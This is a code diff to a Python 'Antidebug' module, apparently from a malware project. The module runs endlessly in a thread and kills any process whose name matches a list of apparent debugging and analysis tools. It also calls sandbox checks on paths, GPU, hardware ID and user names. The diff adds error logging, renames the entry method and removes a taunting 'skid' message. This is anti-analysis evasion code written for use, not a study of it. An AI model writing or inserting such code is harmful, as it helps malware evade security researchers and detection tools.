@@ -317,6 +317,7 @@ class Antidebug(ModuleManager):
     # No timout for this function as it keeps always running
     # @func_set_timeout(1.5)
     def process_check(self):
+        self.mdebug(f"Running `process_check()` in a new Thread - Will kill any suspicous process if any")
         while True:
             for proc in psutil.process_iter():
                 if any(procstr in proc.name().lower() for procstr in PROCESSES):
@@ -324,11 +325,11 @@ class Antidebug(ModuleManager):
                         self.mdebug(f"Killed process: {proc.name()}")
                         proc.kill()
                     except (psutil.NoSuchProcess, psutil.AccessDenied):
-                        self.mdebug(f"[ERROR]: Unable to kill {proc.name()} -> Access Denied")
+                        self.merror(f"[ERROR]: Unable to kill {proc.name()} -> Access Denied | This could be a debugging application")
                     except Exception as e:
-                        self.mdebug(f"[ERROR]: {e}")
+                        self.merror(f"[ERROR]: {e} | This could be a debugging application")
 
-    def __main__(self):
+    def isDebugMode(self):
         try:
             __funcs__ = (
                 'path_check', 'gpu_check', 'hwid_check', 'user_check', 'name_check', 
@@ -349,10 +350,3 @@ class Antidebug(ModuleManager):
             return False
         except Exception as e:
             self.merror(f"{e}")
-
-    def check(self):
-        if Antidebug().__main__():
-            print("fuck you skid")
-        else:
-            print("success")
-            
